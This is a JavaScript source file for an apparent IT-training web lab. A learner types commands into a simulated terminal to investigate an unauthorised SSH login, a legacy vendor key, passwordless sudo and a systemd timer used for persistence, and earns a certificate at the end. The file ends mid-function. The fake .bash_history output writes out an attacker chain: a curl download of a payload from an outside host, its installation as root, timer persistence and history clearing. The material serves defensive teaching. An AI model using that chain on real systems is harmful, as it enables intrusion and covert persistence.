(() => {
  "use strict";

  const $ = (selector) => document.querySelector(selector);
  const screens = {
    welcome: $("#welcomeScreen"),
    lab: $("#labScreen"),
    result: $("#resultScreen")
  };

  const startForm = $("#startForm");
  const learnerNameInput = $("#learnerName");
  const nameError = $("#nameError");
  const terminalForm = $("#terminalForm");
  const commandInput = $("#commandInput");
  const terminalOutput = $("#terminalOutput");
  const terminalBody = $("#terminalBody");
  const timerElement = $("#timer");
  const scoreElement = $("#score");
  const progressText = $("#progressText");
  const progressBar = $("#progressBar");
  const certificateCanvas = $("#certificateCanvas");
  const instructorImage = $("#instructorImage");

  const taskElements = {
    access: $("#taskAccess"),
    identity: $("#taskIdentity"),
    persistence: $("#taskPersistence"),
    report: $("#taskReport")
  };

  const state = {
    learnerName: "",
    access: false,
    identity: false,
    persistence: false,
    report: false,
    score: 0,
    commandHistory: [],
    historyIndex: 0,
    commandCount: 0,
    startedAt: 0,
    elapsedSeconds: 0,
    timerId: null,
    completed: false,
    certificateId: ""
  };

  function showScreen(name) {
    Object.values(screens).forEach((screen) => screen.classList.remove("is-active"));
    screens[name].classList.add("is-active");
    window.scrollTo({ top: 0, behavior: "smooth" });
  }

  function cleanName(value) {
    return value.replace(/\s+/g, " ").trim();
  }

  function isValidName(value) {
    return value.length >= 2 && /[\p{L}]/u.test(value) && /^[\p{L}\p{M} .'-]+$/u.test(value);
  }

  startForm.addEventListener("submit", (event) => {
    event.preventDefault();
    const name = cleanName(learnerNameInput.value);
    if (!isValidName(name)) {
      learnerNameInput.setAttribute("aria-invalid", "true");
      nameError.textContent = "Enter a valid full name using letters, spaces, apostrophes, hyphens, or periods.";
      learnerNameInput.focus();
      return;
    }
    learnerNameInput.removeAttribute("aria-invalid");
    nameError.textContent = "";
    state.learnerName = name;
    beginChallenge();
  });

  learnerNameInput.addEventListener("input", () => {
    learnerNameInput.removeAttribute("aria-invalid");
    nameError.textContent = "";
  });

  function beginChallenge() {
    resetChallengeState();
    appendOutput("SEC-0816: prod-app-02 recorded an SSH session outside the approved maintenance window.\nMission: confirm the access, identify the account and authentication method, trace privilege use and persistence, then submit your finding.", "warning");
    showScreen("lab");
    startTimer();
    setTimeout(() => commandInput.focus(), 180);
  }

  function resetChallengeState() {
    clearInterval(state.timerId);
    state.access = false;
    state.identity = false;
    state.persistence = false;
    state.report = false;
    state.score = 0;
    state.commandHistory = [];
    state.historyIndex = 0;
    state.commandCount = 0;
    state.startedAt = Date.now();
    state.elapsedSeconds = 0;
    state.completed = false;
    state.certificateId = "";
    terminalOutput.replaceChildren();
    commandInput.value = "";
    commandInput.disabled = false;
    timerElement.textContent = "00:00";
    updateProgress();
  }

  function startTimer() {
    clearInterval(state.timerId);
    state.startedAt = Date.now();
    state.timerId = window.setInterval(() => {
      state.elapsedSeconds = Math.floor((Date.now() - state.startedAt) / 1000);
      timerElement.textContent = formatDuration(state.elapsedSeconds);
    }, 250);
  }

  function formatDuration(totalSeconds) {
    const minutes = Math.floor(totalSeconds / 60).toString().padStart(2, "0");
    const seconds = Math.floor(totalSeconds % 60).toString().padStart(2, "0");
    return `${minutes}:${seconds}`;
  }

  terminalForm.addEventListener("submit", (event) => {
    event.preventDefault();
    if (state.completed) return;
    const rawCommand = commandInput.value.trim();
    commandInput.value = "";
    if (!rawCommand) return;
    appendCommand(rawCommand);
    state.commandHistory.push(rawCommand);
    state.historyIndex = state.commandHistory.length;
    state.commandCount += 1;
    executeCommand(rawCommand);
    scrollTerminal();
  });

  commandInput.addEventListener("keydown", (event) => {
    if (event.key === "ArrowUp") {
      event.preventDefault();
      if (state.commandHistory.length) {
        state.historyIndex = Math.max(0, state.historyIndex - 1);
        commandInput.value = state.commandHistory[state.historyIndex] || "";
        requestAnimationFrame(() => commandInput.setSelectionRange(commandInput.value.length, commandInput.value.length));
      }
    }
    if (event.key === "ArrowDown") {
      event.preventDefault();
      if (state.commandHistory.length) {
        state.historyIndex = Math.min(state.commandHistory.length, state.historyIndex + 1);
        commandInput.value = state.commandHistory[state.historyIndex] || "";
      }
    }
  });

  terminalBody.addEventListener("click", () => {
    if (!state.completed) commandInput.focus();
  });

  function tokenize(command) {
    const tokens = [];
    const matcher = /"([^"]*)"|'([^']*)'|([^\s]+)/g;
    let match;
    while ((match = matcher.exec(command)) !== null) tokens.push(match[1] ?? match[2] ?? match[3]);
    return tokens;
  }

  function executeCommand(rawCommand) {
    const tokens = tokenize(rawCommand);
    const command = (tokens.shift() || "").toLowerCase();
    const args = tokens;
    switch (command) {
      case "last":
        handleLast(args);
        break;
      case "lastlog":
        handleLastlog(args);
        break;
      case "journalctl":
        handleJournalctl(args, rawCommand);
        break;
      case "grep":
        handleGrep(args, rawCommand);
        break;
      case "systemctl":
        handleSystemctl(args);
        break;
      case "cat":
        handleCat(args);
        break;
      case "sudo":
        handleSudo(args);
        break;
      case "ssh-keygen":
        handleSshKeygen(args);
        break;
      case "id":
        handleId(args);
        break;
      case "getent":
        handleGetent(args);
        break;
      case "stat":
        handleStat(args);
        break;
      case "find":
        handleFind(args, rawCommand);
        break;
      case "ausearch":
        handleAusearch(args, rawCommand);
        break;
      case "who":
        appendOutput("analyst  pts/0  2026-08-16 03:39 (10.24.8.19)");
        break;
      case "w":
        appendOutput(" 03:43:11 up 19 days, 6:12,  1 user,  load average: 0.07, 0.11, 0.09\nUSER     TTY      FROM          LOGIN@   IDLE   JCPU   PCPU WHAT\nanalyst  pts/0    10.24.8.19   03:39    0.00s  0.03s  0.00s w");
        break;
      case "date":
        appendOutput("Sun Aug 16 03:43:11 IST 2026");
        break;
      case "hostname":
        appendOutput("prod-app-02");
        break;
      case "hostnamectl":
        appendOutput(" Static hostname: prod-app-02\n       Icon name: computer-vm\n         Chassis: vm\nOperating System: Red Hat Enterprise Linux 10.0\n          Kernel: Linux 6.12.0-55.el10.x86_64\n    Architecture: x86-64");
        break;
      case "ss":
        appendOutput("State  Recv-Q Send-Q Local Address:Port  Peer Address:Port Process\nLISTEN 0      128          0.0.0.0:22         0.0.0.0:*\nESTAB  0      0        10.24.4.22:22       10.24.8.19:53108");
        break;
      case "ps":
        appendOutput("USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1 173492 14508 ?        Ss   Jul27   0:42 /usr/lib/systemd/systemd\nroot        1812  0.0  0.0  94152  9120 ?        Ss   Jul27   0:03 /usr/sbin/sshd -D\nanalyst     9921  0.0  0.0  12348  4320 pts/0    R+   03:43   0:00 ps aux");
        break;
      case "submit":
        handleSubmit(args);
        break;
      case "pwd":
        appendOutput("/home/analyst");
        break;
      case "whoami":
        appendOutput("analyst");
        break;
      case "history":
        appendOutput(state.commandHistory.map((item, index) => `${String(index + 1).padStart(4, " ")}  ${item}`).join("\n"));
        break;
      case "clear":
        terminalOutput.replaceChildren();
        break;
      case "help":
        showHelp();
        break;
      case "man":
        handleMan(args[0]);
        break;
      case "echo":
        appendOutput(args.join(" "));
        break;
      case "":
        break;
      default:
        appendOutput(`bash: ${command}: command not found`, "error");
    }
  }

  function handleLast(args) {
    const detailed = args.some((arg) => /[afi]/i.test(arg));
    appendOutput(detailed
      ? "deploysvc pts/1        Sun Aug 16 03:14:08 2026 - Sun Aug 16 03:27:51 2026  (00:13)  203.0.113.77\nrelease   pts/2        Sat Aug 15 21:01:18 2026 - Sat Aug 15 21:18:33 2026  (00:17)  10.24.6.18\nopsadmin  pts/0        Sat Aug 15 09:20:02 2026 - Sat Aug 15 09:42:15 2026  (00:22)  10.24.8.11\nreboot    system boot  Sat Jul 27 21:31:09 2026   still running      0.0.0.0\n\nwtmp begins Sat Jul 27 21:31:09 2026"
      : "deploysvc pts/1        203.0.113.77     Sun Aug 16 03:14 - 03:27  (00:13)\nrelease   pts/2        10.24.6.18      Sat Aug 15 21:01 - 21:18  (00:17)\nopsadmin  pts/0        10.24.8.11      Sat Aug 15 09:20 - 09:42  (00:22)");
    markObjective("access", 20, "✓ Objective 1 passed — the unapproved SSH session and source address were confirmed. +20 points");
  }

  function handleLastlog(args) {
    const userIndex = args.findIndex((arg) => arg === "-u" || arg === "--user");
    const user = userIndex >= 0 ? args[userIndex + 1] : "";
    if (user && user !== "deploysvc") {
      appendOutput(`Username         Port     From                                       Latest\n${user.padEnd(16)} **Never logged in**`);
      return;
    }
    appendOutput("Username         Port     From                                       Latest\ndeploysvc        pts/1    203.0.113.77                               Sun Aug 16 03:14:08 +0530 2026");
    markObjective("access", 20, "✓ Objective 1 passed — the unapproved SSH session and source address were confirmed. +20 points");
  }

  function handleJournalctl(args, rawCommand) {
    const query = rawCommand.toLowerCase();
    if (query.includes("sshd") || query.includes("ssh.service")) {
      appendOutput("Aug 16 03:14:06 prod-app-02 sshd[9342]: Connection from 203.0.113.77 port 51244 on 10.24.4.22 port 22\nAug 16 03:14:08 prod-app-02 sshd[9342]: Accepted publickey for deploysvc from 203.0.113.77 port 51244 ssh2: ED25519 SHA256:Wf2qY8pR0kY6AxP9Lw3N7CqM2xJb5VtE4zHn8KcU1sQ\nAug 16 03:14:08 prod-app-02 sshd[9342]: pam_unix(sshd:session): session opened for user deploysvc(uid=992) by (uid=0)\nAug 16 03:27:51 prod-app-02 sshd[9342]: Received disconnect from 203.0.113.77 port 51244:11: disconnected by user\nAug 16 03:27:51 prod-app-02 sshd[9342]: pam_unix(sshd:session): session closed for user deploysvc");
      markObjective("access", 20, "✓ Objective 1 passed — the unapproved SSH session and source address were confirmed. +20 points");
      markObjective("identity", 25, "✓ Objective 2 passed — deploysvc authenticated with an ED25519 public key. +25 points");
      return;
    }
    if (query.includes("sudo") || query.includes("_comm=sudo") || query.includes("syslog_identifier=sudo")) {
      appendOutput("Aug 16 03:15:12 prod-app-02 sudo[9401]: deploysvc : TTY=pts/1 ; PWD=/home/deploysvc ; USER=root ; COMMAND=/usr/bin/install -m 700 /tmp/.cache-sync /usr/local/bin/.cache-sync\nAug 16 03:16:03 prod-app-02 sudo[9420]: deploysvc : TTY=pts/1 ; PWD=/home/deploysvc ; USER=root ; COMMAND=/usr/bin/cp /tmp/system-update.service /etc/systemd/system/system-update.service\nAug 16 03:16:11 prod-app-02 sudo[9427]: deploysvc : TTY=pts/1 ; PWD=/home/deploysvc ; USER=root ; COMMAND=/usr/bin/cp /tmp/system-update.timer /etc/systemd/system/system-update.timer\nAug 16 03:16:18 prod-app-02 sudo[9435]: deploysvc : TTY=pts/1 ; PWD=/home/deploysvc ; USER=root ; COMMAND=/usr/bin/systemctl enable --now system-update.timer");
      markObjective("persistence", 35, "✓ Objective 3 passed — passwordless sudo and the system-update timer persistence were traced. +35 points");
      return;
    }
    if (query.includes("system-update")) {
      appendOutput("Aug 16 03:16:18 prod-app-02 systemd[1]: Started system-update.timer - Periodic System Update Check.\nAug 16 03:20:00 prod-app-02 systemd[1]: Starting system-update.service - Periodic System Update Worker...\nAug 16 03:20:01 prod-app-02 systemd[1]: system-update.service: Deactivated successfully.");
      markObjective("persistence", 35, "✓ Objective 3 passed — the unauthorised system-update timer was identified as persistence. +35 points");
      return;
    }
    appendOutput("Aug 16 03:14:06 prod-app-02 sshd[9342]: Connection from 203.0.113.77 port 51244\nAug 16 03:14:08 prod-app-02 sshd[9342]: Accepted publickey for deploysvc from 203.0.113.77 port 51244\nAug 16 03:16:18 prod-app-02 systemd[1]: Started system-update.timer - Periodic System Update Check.\nAug 16 03:27:51 prod-app-02 sshd[9342]: session closed for user deploysvc", "info");
  }

  function handleGrep(args, rawCommand) {
    const query = rawCommand.toLowerCase();
    if (query.includes("accepted") || query.includes("deploysvc") || query.includes("publickey") || query.includes("secure")) {
      appendOutput("/var/log/secure:Aug 16 03:14:08 prod-app-02 sshd[9342]: Accepted publickey for deploysvc from 203.0.113.77 port 51244 ssh2: ED25519 SHA256:Wf2qY8pR0kY6AxP9Lw3N7CqM2xJb5VtE4zHn8KcU1sQ\n/var/log/secure:Aug 16 03:15:12 prod-app-02 sudo[9401]: deploysvc : USER=root ; COMMAND=/usr/bin/install -m 700 /tmp/.cache-sync /usr/local/bin/.cache-sync");
      markObjective("access", 20, "✓ Objective 1 passed — the unapproved SSH session and source address were confirmed. +20 points");
      markObjective("identity", 25, "✓ Objective 2 passed — deploysvc authenticated with an ED25519 public key. +25 points");
    } else if (query.includes("system-update") || query.includes("cache-sync")) {
      appendOutput("/var/log/messages:Aug 16 03:16:18 prod-app-02 systemd[1]: Started system-update.timer - Periodic System Update Check.");
      markObjective("persistence", 35, "✓ Objective 3 passed — the unauthorised system-update timer was identified as persistence. +35 points");
    } else {
      appendOutput(`grep: no matching review evidence for '${args.filter((arg) => !arg.startsWith("-")).join(" ")}'`);
    }
  }

  function handleSystemctl(args) {
    const action = (args[0] || "").toLowerCase();
    const joined = args.join(" ").toLowerCase();
    if (action === "list-timers") {
      appendOutput("NEXT                        LEFT     LAST                        PASSED UNIT                         ACTIVATES\nSun 2026-08-16 03:50:00 IST  6min    Sun 2026-08-16 03:40:00 IST  3min system-update.timer          system-update.service\nSun 2026-08-16 04:00:00 IST 16min    Sun 2026-08-16 03:00:01 IST 43min logrotate.timer              logrotate.service\nSun 2026-08-16 06:12:20 IST  2h      Sat 2026-08-15 06:12:20 IST 21h  dnf-makecache.timer          dnf-makecache.service");
      markObjective("persistence", 35, "✓ Objective 3 passed — the unauthorised system-update timer was identified as persistence. +35 points");
      return;
    }
    if (!joined.includes("system-update")) {
      appendOutput("Unit not found in the review evidence.", "error");
      return;
    }
    if (action === "status") {
      appendOutput("● system-update.timer - Periodic System Update Check\n     Loaded: loaded (/etc/systemd/system/system-update.timer; enabled; preset: disabled)\n     Active: active (waiting) since Sun 2026-08-16 03:16:18 IST\n    Trigger: Sun 2026-08-16 03:50:00 IST\n   Triggers: ● system-update.service\n\nNotice: unit created during SEC-0816 review window; not present in approved baseline.", "warning");
    } else if (action === "cat") {
      appendOutput("# /etc/systemd/system/system-update.timer\n[Unit]\nDescription=Periodic System Update Check\n\n[Timer]\nOnBootSec=2min\nOnUnitActiveSec=10min\nUnit=system-update.service\n\n[Install]\nWantedBy=timers.target\n\n# /etc/systemd/system/system-update.service\n[Unit]\nDescription=Periodic System Update Worker\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/.cache-sync");
    } else if (action === "is-enabled") {
      appendOutput("enabled");
    } else {
      appendOutput(`systemctl: action '${action}' is read-only in this review`, "error");
    }
    markObjective("persistence", 35, "✓ Objective 3 passed — the unauthorised system-update timer was identified as persistence. +35 points");
  }

  function handleCat(args) {
    const path = args.find((arg) => !arg.startsWith("-")) || "";
    if (path.includes("authorized_keys")) {
      appendOutput("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEr2B5n2p7kZQ9Vq2Jw1f8M5sA3xL6dN0cR4uT7yP9 legacy-deploy-key@vendor-laptop\n# Fingerprint: SHA256:Wf2qY8pR0kY6AxP9Lw3N7CqM2xJb5VtE4zHn8KcU1sQ\n# CMDB status: owner contract ended 2026-06-30; removal ticket IAM-4412 overdue", "warning");
      markObjective("identity", 25, "✓ Objective 2 passed — deploysvc used an overdue legacy vendor key. +25 points");
    } else if (path.includes(".bash_history")) {
      appendOutput("curl -fsS http://203.0.113.200/payload -o /tmp/.cache-sync\nsudo install -m 700 /tmp/.cache-sync /usr/local/bin/.cache-sync\nsudo cp /tmp/system-update.service /etc/systemd/system/system-update.service\nsudo cp /tmp/system-update.timer /etc/systemd/system/system-update.timer\nsudo systemctl daemon-reload\nsudo systemctl enable --now system-update.timer\nhistory -c");
      markObjective("persistence", 35, "✓ Objective 3 passed — elevated commands and timer persistence were reconstructed. +35 points");
    } else if (path.endsWith("system-update.timer") || path.endsWith("system-update.service")) {
      handleSystemctl(["cat", "system-update.timer"]);
    } else if (path.endsWith(".cache-sync")) {
      appendOutput("#!/bin/sh\n# Quarantined unauthorised artifact\n/usr/bin/logger -t system-update 'external sync attempt blocked by containment policy'", "warning");
      markObjective("persistence", 35, "✓ Objective 3 passed — the unauthorised persistence payload was identified. +35 points");
    } else if (path === "/etc/sudoers.d/deploysvc") {
      appendOutput("deploysvc ALL=(ALL) NOPASSWD: ALL");
    } else {
      appendOutput(`cat: ${path || "missing operand"}: No such file or directory`, "error");
    }
  }

  function handleSudo(args) {
    const joined = args.join(" ").toLowerCase();
    if (joined.includes("-l") && joined.includes("deploysvc")) {
      appendOutput("Matching Defaults entries for deploysvc on prod-app-02:\n    !visiblepw, always_set_home, match_group_by_gid\n\nUser deploysvc may run the following commands on prod-app-02:\n    (ALL) NOPASSWD: ALL", "warning");
    } else {
      appendOutput("sudo: commands are disabled in this read-only security review", "error");
    }
  }

  function handleSshKeygen(args) {
    const joined = args.join(" ");
    if (joined.includes("authorized_keys") || args.includes("-lf") || args.includes("-l")) {
      appendOutput("256 SHA256:Wf2qY8pR0kY6AxP9Lw3N7CqM2xJb5VtE4zHn8KcU1sQ legacy-deploy-key@vendor-laptop (ED25519)");
      markObjective("identity", 25, "✓ Objective 2 passed — the accepted fingerprint matches the legacy deploysvc key. +25 points");
    } else appendOutput("usage: ssh-keygen -lf <public-key-file>", "error");
  }

  function handleId(args) {
    const user = args.find((arg) => !arg.startsWith("-")) || "analyst";
    if (user === "deploysvc") appendOutput("uid=992(deploysvc) gid=992(deploysvc) groups=992(deploysvc),980(appdeploy)");
    else if (user === "analyst") appendOutput("uid=1004(analyst) gid=1004(analyst) groups=1004(analyst),190(systemd-journal)");
    else appendOutput(`id: '${user}': no such user`, "error");
  }

  function handleGetent(args) {
    if ((args[0] || "") === "passwd" && (args[1] || "") === "deploysvc") appendOutput("deploysvc:x:992:992:Legacy deployment service:/home/deploysvc:/bin/bash");
    else appendOutput("getent: no matching entry");
  }

  function handleStat(args) {
    const path = args.find((arg) => !arg.startsWith("-")) || "";
    if (path.includes("system-update")) {
      appendOutput(`  File: ${path}\n  Size: 183       Blocks: 8          IO Block: 4096 regular file\nAccess: (0644/-rw-r--r--)  Uid: (    0/ root)   Gid: (    0/ root)\nModify: 2026-08-16 03:16:11.000000000 +0530\nChange: 2026-08-16 03:16:11.000000000 +0530`);
      markObjective("persistence", 35, "✓ Objective 3 passed — persistence files align with the unauthorised session. +35 points");
    } else appendOutput(`stat: cannot statx '${path}': No such file or directory`, "error");
  }

  function handleFind(args, rawCommand) {
    if (rawCommand.toLowerCase().includes("systemd") || rawCommand.toLowerCase().includes("newermt")) {
      appendOutput("2026-08-16 03:16:11.000000000 +0530 /etc/systemd/system/system-update.service\n2026-08-16 03:16:11.000000000 +0530 /etc/systemd/system/system-update.timer\n2026-08-16 03:16:18.000000000 +0530 /etc/systemd/system/timers.target.wants/system-update.timer");
      markObjective("persistence", 35, "✓ Objective 3 passed — persistence files align with the unauthorised session. +35 points");
    } else appendOutput("find: no review artifacts matched");
  }

  function handleAusearch(args, rawCommand) {
    const query = rawCommand.toLowerCase();
    if (query.includes("deploysvc") || query.includes("9342")) {
      appendOutput("time->Sun Aug 16 03:15:12 2026\ntype=USER_CMD msg=audit(1786830312.121:8201): pid=9401 uid=992 auid=992 ses=221 subj=system_u:system_r:unconfined_service_t:s0 msg='cwd=\"/home/deploysvc\" cmd=\"sudo install -m 700 /tmp/.cache-sync /usr/local/bin/.cache-sync\" terminal=pts/1 res=success'\ntime->Sun Aug 16 03:16:18 2026\ntype=USER_CMD msg=audit(1786830378.992:8214): pid=9435 uid=992 auid=992 ses=221 msg='cmd=\"sudo systemctl enable --now system-update.timer\" terminal=pts/1 res=success'");
      markObjective("persistence", 35, "✓ Objective 3 passed — audit records confirmed privilege use and persistence. +35 points");
    } else appendOutput("<no matches>");
  }

  function handleSubmit(args) {
    const answer = args.join(" ").toLowerCase().trim();
    if (!answer) {
      appendOutput("Usage: submit <access finding>\nInclude the compromised account, access method, and privilege or persistence impact.", "error");
      return;
    }
    if (!state.access || !state.identity || !state.persistence) {
      appendOutput("Submission held: complete and validate the first three evidence objectives before filing the access review.", "warning");
      return;
    }
    const account = /(deploysvc|deploy service)/.test(answer);
    const key = /(ssh|public ?key|ed25519|compromised key|legacy key)/.test(answer);
    const impact = /(sudo|root|system-update|timer|persist)/.test(answer);
    if (!account || !key || !impact) {
      appendOutput("Finding not accepted. Name the compromised identity, the SSH authentication method, and the privilege or persistence impact.", "error");
      return;
    }
    appendOutput("Access review accepted: a compromised legacy ED25519 key authenticated as deploysvc from 203.0.113.77. Overbroad passwordless sudo granted root execution, which installed system-update.timer as persistence.\nRecommended actions: revoke and rotate the key, disable or restrict deploysvc, remove the timer and artifact, scope sudo privileges, and review peer systems for the same fingerprint.", "success");
    markObjective("report", 20, "✓ Objective 4 passed — the unauthorised access finding and impact chain were confirmed. +20 points");
    appendOutput("Challenge complete. Final score: 100/100", "info");
    completeChallenge();
  }

  function showHelp() {
    appendOutput(
      "Security review commands:\n" +
      "  last -Fai                        show login times and source addresses\n" +
      "  lastlog -u <user>                show the account's latest login\n" +
      "  journalctl -u sshd               inspect SSH authentication evidence\n" +
      "  journalctl _COMM=sudo            inspect elevated commands\n" +
      "  grep <pattern> /var/log/secure   search authentication records\n" +
      "  cat <path>                       inspect approved evidence files\n" +
      "  ssh-keygen -lf <key>             display a public-key fingerprint\n" +
      "  sudo -l -U <user>                review configured sudo rights\n" +
      "  systemctl list-timers --all      enumerate timer persistence\n" +
      "  systemctl status|cat <unit>      inspect a suspicious unit\n" +
      "  stat <path> | find <path>        correlate file timestamps\n" +
      "  submit <access finding>          file your final conclusion\n" +
      "  history | clear | help           shell utilities",
      "info"
    );
  }

  function handleMan(topic = "") {
    const pages = {
      last: "LAST(1)\nNAME\n    last — show a listing of previous login sessions\nOPTIONS\n    -F full login/logout times; -a source host; -i numeric address",
      journalctl: "JOURNALCTL(1)\nNAME\n    journalctl — query the systemd journal\nEXAMPLES\n    journalctl -u sshd\n    journalctl _COMM=sudo",
      systemctl: "SYSTEMCTL(1)\nNAME\n    systemctl — inspect systemd units and timers",
      submit: "SUBMIT(1)\nNAME\n    submit — file the unauthorised-access conclusion\nSYNOPSIS\n    submit <access finding>"
    };
    appendOutput(pages[topic] || (topic ? `No manual entry for ${topic}` : "What manual page do you want?"), pages[topic] ? "info" : "error");
  }

  function markObjective(key, points, message) {
    if (state[key]) return;
    state[key] = true;
    state.score += points;
    appendOutput(message, "success");
    updateProgress();
    showToast(message.replace(/^[^—]+—\s*/, "").replace(/\s*\+\d+ points$/, ""));
  }

  function appendCommand(command) {
    const line = document.createElement("div");
    line.className = "output-entry output-command";
    const user = document.createElement("span");
    user.className = "prompt-user";
    user.textContent = "analyst@prod-app-02";
    const path = document.createElement("span");
    path.className = "prompt-path";
    path.textContent = ":~$";
    line.append(user, path, document.createTextNode(` ${command}`));
    terminalOutput.append(line);
  }

  function appendOutput(text, type = "") {
    if (text === "") return;
    const line = document.createElement("div");
    line.className = `output-entry output-text ${type}`.trim();
    line.textContent = text;
    terminalOutput.append(line);
  }

  function scrollTerminal() {
    requestAnimationFrame(() => {
      terminalBody.scrollTop = terminalBody.scrollHeight;
    });
  }

  function updateProgress() {
    const completedCount = [state.access, state.identity, state.persistence, state.report].filter(Boolean).length;
    scoreElement.textContent = String(state.score);
    progressText.textContent = `${completedCount} of 4 complete`;
    progressBar.style.width = `${completedCount * 25}%`;
    Object.entries(taskElements).forEach(([key, element]) => element.classList.toggle("is-complete", state[key]));
  }

  function completeChallenge() {
    if (state.completed || !state.report) return;
    state.completed = true;
    state.score = 100;
    state.elapsedSeconds = Math.max(1, Math.floor((Date.now() - state.startedAt) / 1000));
    clearInterval(state.timerId);
    timerElement.textContent = formatDuration(state.elapsedSeconds);
    commandInput.disabled = true;
    state.certificateId = makeCertificateId(state.learnerName);
    RCWPassport.record({ type: "lab", name: state.learnerName });
    window.setTimeout(() => {
      $("#resultName").textContent = state.learnerName;
      $("#finalTime").textContent = formatDuration(state.elapsedSeconds);
      $("#commandCount").textContent = String(state.commandCount);
      showScreen("result");
      renderCertificate();
      showToast("Perfect score — your certificate is ready.");
    }, 1000);
  }

  $("#resetButton").addEventListener("click", () => {
    resetChallengeState();
    appendOutput("Access review reset. Start by confirming the unapproved login session.", "info");
    startTimer();
    commandInput.focus();
  });

  $("#replayButton").addEventListener("click", beginChallenge);

  $("#fullscreenButton").addEventListener("click", async () => {
    try {
      if (!document.fullscreenElement) {
        await document.documentElement.requestFullscreen();
        showToast("Focus mode enabled.");
      } else await document.exitFullscreen();
    } catch {
      showToast("Focus mode is not available in this browser.");
    }
  });

  function showToast(message) {
    const toast = $("#toast");
    toast.querySelector("p").textContent = message;
    toast.classList.add("is-visible");
    clearTimeout(showToast.timeoutId);
    showToast.timeoutId = setTimeout(() => toast.classList.remove("is-visible"), 2800);
  }

  function makeCertificateId(name) {
    const now = new Date();
    const datePart = [now.getFullYear(), String(now.getMonth() + 1).padStart(2, "0"), String(now.getDate()).padStart(2, "0")].join("");
    let hash = 2166136261;
    const source = `${name}|${now.toISOString()}|${state.elapsedSeconds}|access`;
    for (let index = 0; index < source.length; index += 1) {
      hash ^= source.charCodeAt(index);
      hash = Math.imul(hash, 16777619);
    }
    return `RCW-IAR-${datePart}-${(hash >>> 0).toString(36).toUpperCase().padStart(7, "0").slice(-7)}`;
  }

  function renderCertificate() {
    const canvas = certificateCanvas;
    const ctx = canvas.getContext("2d");
    const W = canvas.width;
    const H = canvas.height;

    ctx.clearRect(0, 0, W, H);
    ctx.fillStyle = "#f4f0e6";
    ctx.fillRect(0, 0, W, H);

    // Soft paper texture.
    ctx.save();
    ctx.globalAlpha = 0.035;
    ctx.fillStyle = "#0b2b4c";
    for (let y = 0; y < H; y += 18) {
      for (let x = (y / 18) % 2 ? 9 : 0; x < W; x += 18) ctx.fillRect(x, y, 1.5, 1.5);
    }
    ctx.restore();

    // Deep-blue architectural border.
    ctx.strokeStyle = "#08233f";
    ctx.lineWidth = 22;
    ctx.strokeRect(26, 26, W - 52, H - 52);
    ctx.strokeStyle = "#12a9e9";
    ctx.lineWidth = 3;
    ctx.strokeRect(48, 48, W - 96, H - 96);
    ctx.strokeStyle = "#c8a847";
    ctx.lineWidth = 2;
    ctx.strokeRect(62, 62, W - 124, H - 124);

    // Branded top band and corner geometry.
    ctx.fillStyle = "#08233f";
    ctx.fillRect(64, 64, W - 128, 130);
    ctx.fillStyle = "#0ba8ee";
    ctx.fillRect(64, 188, W - 128, 6);
    ctx.beginPath();
    ctx.moveTo(64, 194);
    ctx.lineTo(240, 194);
    ctx.lineTo(64, 365);
    ctx.closePath();
    ctx.fillStyle = "rgba(11,168,238,.08)";
    ctx.fill();

    // RCW terminal emblem.
    roundedRect(ctx, 98, 91, 74, 74, 16);
    ctx.fillStyle = "#0ba8ee";
    ctx.fill();
    ctx.fillStyle = "#fff";
    ctx.font = "800 24px ui-monospace, monospace";
    ctx.textAlign = "center";
    ctx.fillText(">_", 135, 139);

    ctx.textAlign = "left";
    ctx.fillStyle = "#ffffff";
    ctx.font = "800 30px Arial, sans-serif";
    ctx.fillText("RCW", 195, 126);
    ctx.fillStyle = "#4cc9ff";
    ctx.font = "800 13px Arial, sans-serif";
    ctx.letterSpacing = "3px";
    ctx.fillText("IT TRAINING", 196, 151);
    ctx.letterSpacing = "0px";

    ctx.textAlign = "right";
    ctx.fillStyle = "#86a7bd";
    ctx.font = "600 14px Arial, sans-serif";
    ctx.fillText("LEARN  •  PRACTICE  •  MASTER  •  ACHIEVE", W - 101, 130);
    ctx.fillStyle = "#c9e9f6";
    ctx.font = "500 12px Arial, sans-serif";
    ctx.fillText("www.rcwittraining.in", W - 101, 154);

    ctx.textAlign = "center";
    ctx.fillStyle = "#0ba8ee";
    ctx.font = "800 15px Arial, sans-serif";
    ctx.fillText("CERTIFICATE OF ACHIEVEMENT", W / 2, 266);
    ctx.fillStyle = "#08233f";
    ctx.font = "700 61px Georgia, serif";
    ctx.fillText("Linux Challenge Champion", W / 2, 336);

    ctx.fillStyle = "#6c7c86";
    ctx.font = "400 19px Georgia, serif";
    ctx.fillText("This certificate is proudly presented to", W / 2, 391);

    ctx.fillStyle = "#092b4c";
    setFittedFont(ctx, state.learnerName, 830, 57, 34, "700", "Georgia, serif");
    ctx.fillText(state.learnerName, W / 2, 468);
    const nameWidth = Math.min(830, ctx.measureText(state.learnerName).width + 90);
    const gradient = ctx.createLinearGradient(W / 2 - nameWidth / 2, 0, W / 2 + nameWidth / 2, 0);
    gradient.addColorStop(0, "rgba(11,168,238,0)");
    gradient.addColorStop(.5, "#0ba8ee");
    gradient.addColorStop(1, "rgba(11,168,238,0)");
    ctx.fillStyle = gradient;
    ctx.fillRect(W / 2 - nameWidth / 2, 489, nameWidth, 2);

    ctx.fillStyle = "#4f6472";
    ctx.font = "400 18px Arial, sans-serif";
    ctx.fillText("for successfully completing the RCW Linux unauthorised access review", W / 2, 543);
    ctx.fillText("by tracing compromised SSH access, root privilege use, and persistence.", W / 2, 574);

    // Achievement badge.
    const badgeX = 206;
    const badgeY = 706;
    ctx.beginPath();
    ctx.arc(badgeX, badgeY, 76, 0, Math.PI * 2);
    ctx.fillStyle = "#08233f";
    ctx.fill();
    ctx.beginPath();
    ctx.arc(badgeX, badgeY, 64, 0, Math.PI * 2);
    ctx.strokeStyle = "#c8a847";
    ctx.lineWidth = 3;
    ctx.stroke();
    ctx.fillStyle = "#ffffff";
    ctx.font = "800 34px Arial, sans-serif";
    ctx.fillText("100", badgeX, badgeY + 1);
    ctx.fillStyle = "#52d4ff";
    ctx.font = "800 12px Arial, sans-serif";
    ctx.fillText("/ 100", badgeX, badgeY + 25);
    ctx.fillStyle = "#6a7d88";
    ctx.font = "800 11px Arial, sans-serif";
    ctx.fillText("FINAL SCORE", badgeX, badgeY + 102);

    // Issue details.
    ctx.textAlign = "left";
